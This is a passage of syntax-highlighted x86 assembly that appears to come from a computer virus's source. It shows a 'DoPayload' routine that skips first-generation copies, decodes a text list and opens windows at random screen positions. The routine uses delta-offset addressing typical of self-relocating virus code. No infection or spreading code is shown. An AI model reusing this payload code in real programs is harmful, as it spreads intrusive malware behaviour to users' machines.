</span><span class="sc1">;≥ €‹€ €‹€ €‹€ €   € € €‹€ € €                     ;</span><span class="sc0">
</span><span class="sc1">;≥ €   € €  €  €‹‹ €‹€ € € €‹ﬂ                     ;</span><span class="sc0">
</span><span class="sc1">;≥                                                 ;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DoPayload</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">firstgen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">do_it_now</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">do_it_now</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">text_start</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">list_len</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">not_list</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">text_start</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">current</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetDC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hdc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">chars</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetCharWidthA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"A"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Z"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">textmetric</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetTextMetricsA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hdc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetSystemMetrics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">SM_CXFULLSCREEN</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">xmax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetSystemMetrics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">SM_CYFULLSCREEN</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ymax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">textmetric.tmHeight</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">textmetric.tmAscent</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">textmetric.tmDescent</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ylength</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">new_window</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">current</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrlen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrlen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">current</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ok_len</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ok_len</span><span class="sc4">:</span><span class="sc0">                                            </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">chars</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">xlength</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">calculate_length</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"A"</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">do_Z</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">estimate</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">textmetric.tmAveCharWidth</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">compute</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">do_Z</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Z"</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jna</span><span class="sc0"> </span><span class="sc5">do_chars</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">estimate</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">do_chars</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"A"</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">compute</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">xlength</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">calculate_length</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetModuleHandleA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; get our handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hInst</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; save it</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wc.wcxStyle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">CS_HREDRAW</span><span class="sc4">+</span><span class="sc5">CS_VREDRAW</span><span class="sc4">+</span><span class="sc0">\</span><span class="sc1">;window style</span><span class="sc0">
                           </span><span class="sc5">CS_GLOBALCLASS</span><span class="sc4">+</span><span class="sc5">CS_NOCLOSE</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WndProc</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wc.wcxWndProc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; window procedure</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wc.wcxClsExtra</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; -</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wc.wcxWndExtra</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; -</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hInst</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wc.wcxInstance</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; instance (handle)</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_LoadIconA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hInst</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IDI_APPLICATION</span><span class="sc0"> </span><span class="sc1">; load our icon</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourhIcon</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wc.wcxIcon</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wc.wcxSmallIcon</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_LoadCursorA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IDC_ARROW</span><span class="sc0">      </span><span class="sc1">; load out cursor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wc.wcxCursor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wc.wcxBkgndBrush</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">COLOR_WINDOW</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wc.wcxMenuName</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc1">; menu</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szClassName</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wc.wcxClassName</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; class name</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wc</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_RegisterClassExA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; register the class!</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">xmax</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">xlength</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">xpos</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ymax</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ylength</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ypos</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szClassName</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szTitleName</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateWindowExA</span><span class="sc4">],</span><span class="sc5">ExtendedStyle</span><span class="sc4">,</span><span class="sc0">\</span><span class="sc1">; Create the Window!</span><span class="sc0">
                             </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0">\                 </span><span class="sc1">;</span><span class="sc0">
                             </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0">\                 </span><span class="sc1">;</span><span class="sc0">
                             </span><span class="sc5">DefaultStyle</span><span class="sc4">,</span><span class="sc0">\        </span><span class="sc1">;</span><span class="sc0">
                             </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">xpos</span><span class="sc4">],</span><span class="sc0">\          </span><span class="sc1">;</span><span class="sc0">
                             </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ypos</span><span class="sc4">],</span><span class="sc0">\          </span><span class="sc1">;</span><span class="sc0">
                             </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">xlength</span><span class="sc4">],</span><span class="sc0">\       </span><span class="sc1">;</span><span class="sc0">
                             </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ylength</span><span class="sc4">],</span><span class="sc0">\       </span><span class="sc1">;</span><span class="sc0">
                             </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">\                   </span><span class="sc1">;</span><span class="sc0">
                             </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">\                   </span><span class="sc1">;</span><span class="sc0">
                             </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hInst</span><span class="sc4">],</span><span class="sc0">\         </span><span class="sc1">;</span><span class="sc0">
                             </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newhwnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; save handle</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_UpdateWindow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newhwnd</span><span class="sc4">]</span><span class="sc1">; and update it...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_InvalidateRect</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newhwnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">msg_loop</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetMessageA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; get a message</span><span class="sc0">
